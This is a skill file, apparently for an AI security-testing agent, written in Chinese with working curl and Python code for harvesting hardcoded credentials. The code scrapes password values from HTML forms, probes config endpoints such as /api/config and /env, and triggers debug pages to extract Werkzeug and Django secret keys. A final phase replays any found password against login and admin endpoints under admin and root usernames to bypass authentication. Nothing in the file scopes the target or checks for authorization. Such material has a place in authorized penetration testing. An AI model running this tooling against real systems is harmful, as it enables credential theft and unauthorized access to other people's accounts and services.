---
name: hardcoded-credential-hunt
description: 检测 HTML 表单、JavaScript 和 API 响应中硬编码的口令。
version: 1.1.0
revision_date: 2026-07-25
license: MIT
platforms: [linux]
compatibility: Requires curl, python3
metadata:
  tags: [recon, password, credential, hardcoded, HTML, javascript, API]
  category: recon
  related_skills:
    - api-noauth-hunt
    - js-secrets-extraction
    - source-leak-hunt
---

# 硬编码凭据挖掘

检测被硬编码进客户端代码或 HTML 响应中的凭据。目标包括表单 `value` 属性中的主口令、内联脚本中的密钥、配置端点中的 API 令牌，以及通过调试错误页面泄露的明文凭据。这类漏洞可完全绕过身份认证 —— 无需暴力破解。

## When to Use

- 应用提供的 HTML 表单带有预填充或隐藏的口令字段。
- 配置端点（`/api/config`、`/env`、`/settings`）返回包含类凭据字符串的 JSON。
- 调试/错误页面在 JavaScript 变量中泄露应用密钥。
- 未认证的 API 端点返回控制认证行为的数据（重置、退出登记、管理员操作）。
- JavaScript 打包文件中包含符合口令模式的字符串赋值。

## Prerequisites

- 具备 curl 和 python3 的 `terminal`。
- 目标在配置/设置端点上未做正确认证即提供 HTML、JSON 或 JavaScript。
- 至少能访问一个公开页面、表单或 API 端点。

## How to Run

```bash
# Scan HTML for password fields with pre-filled values
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/PATH" | grep -Poi '(?:password|passwd|senha|pass|pwd|secret)\s*[=:"]\s*"?[^"&\s]{4,30}"?' | head -10

# Scan JSON config endpoints for credential-like keys
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/api/config" | python3 -c "
import sys, json, re
try:
    data = json.load(sys.stdin)
    for k, v in data.items() if isinstance(data, dict) else []:
        if any(x in k.lower() for x in ['pass','secret','key','token','auth']):
            print(f'{k}: {v}')
except: pass
"

```

## 快速检测

```bash
# Scan HTML for password fields with pre-filled values
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/PATH" | grep -Poi '(?:password|passwd|senha|pass|pwd|secret)\s*[=:"]\s*"?[^"&\s]{4,30}"?' | head -10

# Scan JSON config endpoints for credential-like keys
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/api/config" | python3 -c "
import sys, json, re
try:
    data = json.load(sys.stdin)
    for k, v in data.items() if isinstance(data, dict) else []:
        if any(x in k.lower() for x in ['pass','secret','key','token','auth']):
            print(f'{k}: {v}')
except: pass
"

# Scan inline JavaScript for hardcoded secrets
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/" | grep -Po '(?:SECRET|PASSWORD|API_KEY|TOKEN)\s*=\s*"[^"]{8,}"' | head -10
```

## Procedure

### 阶段 1 — HTML 表单检查

寻找带有 `value` 属性的口令字段，或包含凭据的隐藏输入项：

```bash
# Extract all password inputs
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/PATH" | python3 -c "
import sys, re
html = sys.stdin.read()
# Inputs with type=password and non-empty value
for m in re.finditer(r'<input[^>]*type\s*=\s*[\"\']password[\"\'][^>]*value\s*=\s*[\"\']([^\"\']+)[\"\']', html):
    print(f'PASSWORD FIELD: {m.group(1)}')
# Hidden inputs that look like passwords
for m in re.finditer(r'<input[^>]*type\s*=\s*[\"\']hidden[\"\'][^>]*name\s*=\s*[\"\']([^\"\']*(?:pass|senha|secret|token|key)[^\"\']*)[\"\'][^>]*value\s*=\s*[\"\']([^\"\']+)[\"\']', html, re.IGNORECASE):
    print(f'HIDDEN CREDENTIAL: {m.group(1)} = {m.group(2)}')
"
```

### 阶段 2 — 配置端点探测

探测可能泄露凭据的常见配置端点：

```bash
for path in /api/config /api/settings /env /api/env /config.json /api/config.json \
            /api/v1/config /api/configuration /api/v2/settings /api/status; do
  result=$(curl --max-time 30 --connect-timeout 10 -sk "https://target.com$path" -w "\n%{http_code}" 2>/dev/null)
  code=$(echo "$result" | tail -1)
  if [ "$code" = "200" ]; then
    echo "=== $path (200) ==="
    echo "$result" | python3 -c "
import sys, json, re
data = sys.stdin.read()
# Try JSON
try:
    obj = json.loads(data)
    for k, v in obj.items() if isinstance(obj, dict) else []:
        if any(x in str(k).lower() for x in ['pass','secret','key','token','auth','jwt']):
            print(f'  {k}: {v}')
except:
    # Try regex on plain text
    for m in re.finditer(r'(?:password|passwd|secret|token|api[_-]?key)\s*[=:]\s*[\"']([^\"']{4,})[\"']', data, re.I):
        print(f'  {m.group(0)}')
" | head -20
  fi
done
```

### 阶段 3 — 调试错误页面分析

Werkzeug、Django 和 Express 的调试页面常常在内联 JavaScript 中泄露密钥：

```bash
# Trigger an error and check for credential leaks
curl --max-time 30 --connect-timeout 10 -sk "https://target.com:5000/ERROR_TRIGGER_PATH" -o /tmp/error.html
python3 - <<'PY'
import re
html = open('/tmp/error.html').read()
# Werkzeug debugger SECRET
match = re.search(r'SECRET\s*=\s*["]([^"\']+)["]', html)
if match: print(f'WERKZEUG_SECRET: {match.group(1)}')
# Django settings
for m in re.finditer(r'SECRET_KEY\s*=\s*["]([^"\']+)["]', html):
    print(f'DJANGO_SECRET: {m.group(1)}')
# Generic credential patterns
for m in re.finditer(r'(?:PASSWORD|PASS|TOKEN|API_KEY)\s*=\s*["]([^"\']{6,})["]', html, re.I):
    print(f'LEAKED: {m.group(0)}')
PY
```

### 阶段 4 — 身份认证绕过测试

发现硬编码口令后，用它对所有认证端点进行测试：

```bash
PASSWORD="found_password"
# Test against common auth endpoints
for endpoint in /login /api/login /api/auth/login /auth /admin /api/admin; do
  for user in admin administrator root; do
    code=$(curl --max-time 30 --connect-timeout 10 -sk -o /dev/null -w "%{http_code}" \
      -d "username=$user&password=$PASSWORD" \
      "https://target.com$endpoint")
    if [ "$code" = "302" ] || [ "$code" = "200" ]; then
      echo "SUCCESS: $user:$PASSWORD at $endpoint (HTTP $code)"
    fi
  done
done
```

## Pitfalls

- **占位值看起来像真的。** 报告前先测试 `password123`、`changeme` 和空字符串 —— 它们通常是开发默认值。
- **该凭据可能有作用范围限制。** 用于"退出登记"的口令并不是完整的管​​理员口令。评分前先将凭据映射到其实际权限。
- **表单值可能是动态的。** 检查该口令是按会话变化（CSRF 令牌模式），还是真正静态的。
- **Base64 不是加密。** 解码 JavaScript 中任何形似 base64 的字符串 —— 它们经常包含凭据。
- **速率限制可能阻断测试。** 认证尝试之间间隔 2-3 秒。

## Verification

1. **确认凭据是静态的：** 抓取该页面/端点三次，验证每次口令值完全相同。
2. **确认它能授予访问权限：** 在预期端点使用该凭据，并与使用随机错误凭据的已知失败尝试进行对比。仅仅返回 200/302 并不能证明 —— 兜底应用在失败时也会返回 200。需要响应正文差异：签发了会话令牌、重定向到已认证区域，或出现了失败尝试中不存在的账户专属内容。
3. **映射权限级别：** 用该凭据测试其他端点以确定作用范围（只读、写入、管理员、重置）。
4. **检查审计痕迹：** 在请求中携带唯一标识符重复该访问，验证该操作出现在日志中（确认真实影响）。

---

## 相关技能

- **`api-noauth-hunt`** —— 利用完全缺乏认证的 API 端点。
- **`js-secrets-extraction`** —— 在 JavaScript 打包文件中寻找 API 密钥和令牌。
- **`source-leak-hunt`** —— 检测暴露的配置文件（.env、wp-config 等）。
- **`flask-werkzeug-attack`** —— 利用 Werkzeug 调试器的 SECRET 泄露与调用栈回溯披露。
